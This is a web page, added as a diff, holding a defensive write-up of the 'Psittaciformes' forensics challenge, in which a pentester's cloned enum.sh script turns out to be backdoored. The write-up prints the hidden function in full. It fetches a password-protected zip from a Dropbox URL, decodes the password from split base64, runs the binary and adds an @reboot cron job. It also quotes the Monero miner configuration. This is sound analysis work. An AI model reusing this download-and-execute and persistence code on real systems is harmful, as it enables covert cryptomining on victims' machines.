@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>Psittaciformes - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Psittaciformes.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for Psittaciformes sherlock - Easy difficulty level">
+    <meta name="keywords" content="Sherlock, Psittaciformes, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Psittaciformes</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">May 29, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/Psittaciformes/solved.png" /></p>
+<h1>Task 1</h1>
+<p>After unzipping the challenge file, a single <code>catscale_parrot_20241223-2233.tar.gz</code> tarball was extracted.</p>
+<p>I can extract it once again with tar.</p>
+<p><img alt="files" src="../images/Psittaciformes/files.png" /></p>
+<p>There were many categorized logfiles inside, but the user_files directory caught my eye.</p>
+<p>Since there was a repository used, I'll search for anything that could contain command history.</p>
+<p><img alt="user" src="../images/Psittaciformes/user.png" /></p>
+<p>Bash History of johnspire is what I'd like to check now. Bash_history contains the history of commands used by this user.</p>
+<p><img alt="history" src="../images/Psittaciformes/history.png" /></p>
+<p>The pentester cloned 3 repos but used only one script. I'll take the first repo name and input it as my answer.</p>
+<p><img alt="task1" src="../images/Psittaciformes/task1.png" /></p>
+<h1>Task 2</h1>
+<p>Having discovered the repository, I copied the link and checked it out on github.</p>
+<p><img alt="repo" src="../images/Psittaciformes/repo.png" /></p>
+<p>There's only a single enum.sh script, which the pentester ran on the machine as I've seen in the bash_history file.</p>
+<p>Looking at the code, this script just calls various tools for scanning. However, there is one function that looks incredibly suspicious.</p>
+<div class="codehilite"><pre><span></span><code><span class="c">do_wget_and_run() {</span>
+<span class="c">    f1=&quot;https://www</span><span class="nt">.</span><span class="c">dropbox</span><span class="nt">.</span><span class="c">com/scl/fi/uw8oxug0jydibnorjvyl2&quot;</span>
+<span class="c">    f2=&quot;/blob</span><span class="nt">.</span><span class="c">zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1&quot;</span>
+<span class="c">    OUTPUT_FILE=&quot;/tmp/</span><span class="nt">.</span><span class="c">hidden_$RANDOM</span><span class="nt">.</span><span class="c">zip&quot;  </span>
+<span class="c">    UNZIP_DIR=&quot;/tmp/&quot; </span>
+<span class="c">    part1=&quot;c3VwZXI=&quot;</span>
+<span class="c">    part2=&quot;aGFja2Vy&quot;</span>
+<span class="c">    PASSWORD=$(echo &quot;$part1$part2&quot; | base64 </span><span class="nb">-</span><span class="c">d)  </span>
+
+<span class="c">    FILE_URL=&quot;${f1}${f2}&quot;  </span>
+
+<span class="c">    echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">    echo &quot; System validation underway</span><span class="nt">...</span><span class="c">&quot;</span>
+<span class="c">    echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">    echo &quot;\n&quot;</span>
+
+<span class="c">    # Download the file</span>
+<span class="c">    echo &quot;Establishing connection to remote resource</span><span class="nt">...</span><span class="c">&quot;</span>
+<span class="c">    curl </span><span class="nb">-</span><span class="c">L </span><span class="nb">-</span><span class="c">o &quot;$OUTPUT_FILE&quot; &quot;$FILE_URL&quot;</span>
+
+<span class="c">    if </span><span class="k">[</span><span class="c"> $? </span><span class="nb">-</span><span class="c">ne 0 </span><span class="k">]</span><span class="c">; then</span>
+<span class="c">        echo &quot;Error during retrieval process</span><span class="nt">.</span><span class="c"> Terminating</span><span class="nt">.</span><span class="c">&quot;</span>
+<span class="c">        exit 1</span>
+<span class="c">    fi</span>
+
+<span class="c">    # Validate the downloaded file</span>
+<span class="c">    FILE_TYPE=$(file </span><span class="nb">-</span><span class="c">b &quot;$OUTPUT_FILE&quot;)</span>
+<span class="c">    if </span><span class="k">[[</span><span class="c"> &quot;$FILE_TYPE&quot; != *&quot;Zip archive data&quot;* </span><span class="k">]]</span><span class="c">; then</span>
+<span class="c">        echo &quot;Artifact does not match expected configuration</span><span class="nt">.</span><span class="c"> Exiting</span><span class="nt">.</span><span class="c">&quot;</span>
+<span class="c">        exit 1</span>
+<span class="c">    fi</span>
+
+<span class="c">    echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">    echo &quot; Preparing extracted elements for deployment&quot;</span>
+<span class="c">    echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+
+<span class="c">    # Extract the ZIP file</span>
+<span class="c">    unzip </span><span class="nb">-</span><span class="c">o </span><span class="nb">-</span><span class="c">P &quot;$PASSWORD&quot; &quot;$OUTPUT_FILE&quot; </span><span class="nb">-</span><span class="c">d &quot;$UNZIP_DIR&quot;</span>
+
+<span class="c">    if </span><span class="k">[</span><span class="c"> $? </span><span class="nb">-</span><span class="c">ne 0 </span><span class="k">]</span><span class="c">; then</span>
+<span class="c">        echo &quot;Error during extraction process</span><span class="nt">.</span><span class="c"> Terminating</span><span class="nt">.</span><span class="c">&quot;</span>
+<span class="c">        exit 1</span>
+<span class="c">    fi</span>
+
+<span class="c">    # Locate and execute the file</span>
+<span class="c">    BLOB_PATH=&quot;$UNZIP_DIR/blob&quot;</span>
+<span class="c">    if </span><span class="k">[</span><span class="c"> </span><span class="nb">-</span><span class="c">f &quot;$BLOB_PATH&quot; </span><span class="k">]</span><span class="c">; then</span>
+<span class="c">        echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">        echo &quot; Finalizing deployment sequence&quot;</span>
+<span class="c">        echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">        chmod </span><span class="nb">+</span><span class="c">x &quot;$BLOB_PATH&quot;</span>
+<span class="c">        &quot;$BLOB_PATH&quot;</span>
+
+<span class="c">        # Add a cron job to run the file at startup</span>
+<span class="c">        echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">        echo &quot; Adding to cron for startup execution&quot;</span>
+<span class="c">        echo &quot;</span><span class="nb">------------------------------------------------------------------------------</span><span class="c">&quot;</span>
+<span class="c">        (crontab </span><span class="nb">-</span><span class="c">l 2</span><span class="nv">&gt;</span><span class="c">/dev/null; echo &quot;@reboot $BLOB_PATH&quot;) | crontab </span><span class="nb">-</span>
+<span class="c">    else</span>
+<span class="c">        echo &quot;Required component missing from extracted set</span><span class="nt">.</span><span class="c"> Terminating</span><span class="nt">.</span><span class="c">&quot;</span>
+<span class="c">        exit 1</span>
+<span class="c">    fi</span>
+<span class="c">}</span>
+</code></pre></div>
+
+<p>It tries to download a .zip archive from dropbox, unzips it, and then runs whatever is located inside. Not only that, it also sets up a cronjob so that the file will run at startup.</p>
+<p>I'll input this function as the answer to task 2.</p>
+<p><img alt="task2" src="../images/Psittaciformes/task2.png" /></p>
+<h1>Task 3</h1>
+<p>There was a base64-encoded password, split into two parts and stored within the variables part1 and part2.</p>
+<p>I'll take both pieces and I'll put them into cyberchef to decode the password.</p>
+<p><img alt="cyberchef" src="../images/Psittaciformes/cyberchef.png" /> </p>
+<p>The password for this .zip file is: superhacker.</p>
+<p><img alt="task3" src="../images/Psittaciformes/task3.png" /></p>
+<h1>Task 4</h1>
+<p>To get the full path of the zip file, all I have to do is just combine the two URL pieces (f1,f2) from the script code on github.</p>
+<p>f1: <code>https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2</code></p>
+<p>f2: <code>/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&amp;st=v22geon6&amp;dl=1</code></p>
+<p><img alt="task4" src="../images/Psittaciformes/task4.png" /></p>
+<h1>Task 5</h1>
+<p>Back on the github repo page, I quickly found a relevant commit in which the comments were added.</p>
+<p><img alt="commit" src="../images/Psittaciformes/commit.png" /></p>
+<p>However, in order to get the exact date of the commit I'll have to clone the repo onto my machine.</p>
+<p>I'll keep the commit hash in my mind, and I'll run git log in the cloned repo.</p>
+<p><img alt="commiter" src="../images/Psittaciformes/commiter.png" /></p>
+<p>The first commit from the top matches the hash, so I'll take the date from that one and I'll input it as my answer to task 5.</p>
+<p><img alt="task5" src="../images/Psittaciformes/task5.png" /></p>
+<h1>Task 6</h1>
+<p>I can easily see the changes made to a specific line in a script. I'll do so using git log.</p>
+<p><code>git log -L 68,68:enum.sh</code></p>
+<p>I specified 68,68 to grab changes made only within that line(that is where the URL bits begin), -L to trace by line, and enum.sh to check the script only.</p>
+<p><img alt="log" src="../images/Psittaciformes/log.png" /></p>
+<p>I can see the original URL being replaced. I'll take the old one and input it as the answer to the task.</p>
+<p><img alt="task6" src="../images/Psittaciformes/task6.png" /></p>
+<h1>Task 7</h1>
+<p>I'll go to the mitre website and I'll search for persistence tactics related to cron since that was what I've seen used in the script.</p>
+<p><img alt="mitre" src="../images/Psittaciformes/mitre.png" /></p>
+<p>I'll input <code>T1053.003</code> as the answer to the 7th task.</p>
+<h1>Task 8</h1>
+<p>To solve the final task, I'll have to get the malicious zip file that was downloaded by the attacker.</p>
+<p>I'll navigate to the dropbox link found in the script, using the decoded password from task 3(superhacker) to unzip the archive.</p>
+<p>There is an executable file, but there's also a config file. Before doing anything with the binary, I will take a look at the JSON file.</p>
+<div class="codehilite"><pre><span></span><code># snippet
+
+        {
+            &quot;algo&quot;: null,
+            &quot;coin&quot;: &quot;XMR&quot;,
+            &quot;url&quot;: &quot;xmr.kryptex.network:7777&quot;,
+            &quot;user&quot;: &quot;48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD/MyFirstRig&quot;,
+            &quot;pass&quot;: &quot;x&quot;,
+            &quot;rig-id&quot;: null,
+            &quot;nicehash&quot;: false,
+            &quot;keepalive&quot;: true,
+            &quot;enabled&quot;: true,
+            &quot;tls&quot;: false,
+            &quot;tls-fingerprint&quot;: null,
+            &quot;daemon&quot;: false,
+            &quot;socks5&quot;: null,
+            &quot;self-select&quot;: null,
+            &quot;submit-to-origin&quot;: false
+        }
+    ],
+</code></pre></div>
+
+<p>Looking at this config file, I can say with confidence that the binary is an aggressive cryptocurrency miner.</p>
+<p>With no limits on CPU usage, it would impact the target device severely and could make it unusable.</p>
+<p>Additionally, the wallet address of our attacker is listed under "user". With a wallet address, I could perform some extra reconnaissance to get more information about the attacker and maybe even report them.</p>
+<p>This technique is classified as T1496 or resource hijacking on mitre. Cryptominers fit into the .001 subtechnique(Compute hijacking).</p>
+<p><img alt="mire" src="../images/Psittaciformes/mire.png" /></p>
+<p><img alt="task8" src="../images/Psittaciformes/task8.png" /></p>
+<p>Solved!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "Psittaciformes") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
